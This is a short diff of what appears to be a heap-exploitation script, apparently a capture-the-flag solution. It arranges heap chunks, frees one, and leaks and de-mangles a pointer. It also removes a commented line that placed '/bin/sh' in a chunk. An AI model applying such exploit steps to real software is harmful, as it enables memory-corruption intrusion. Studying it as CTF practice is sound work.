@@ -76,12 +76,12 @@ free(0)
 malloc(0, 1070) # malloc slightly larger chunk
 malloc(2, 24)
 malloc(3, 24)
-# malloc(2, 24, b"/bin/sh") 
 print("free-ing")
 free(0)
 
-leak = decrypt(readLeak(view(0)))
-print(hex(leak))
+encrypted_leak = readLeak(view(0))
+leak = decrypt(encrypted_leak)
+print("leak:", hex(encrypted_leak), hex(leak))
 
 
 
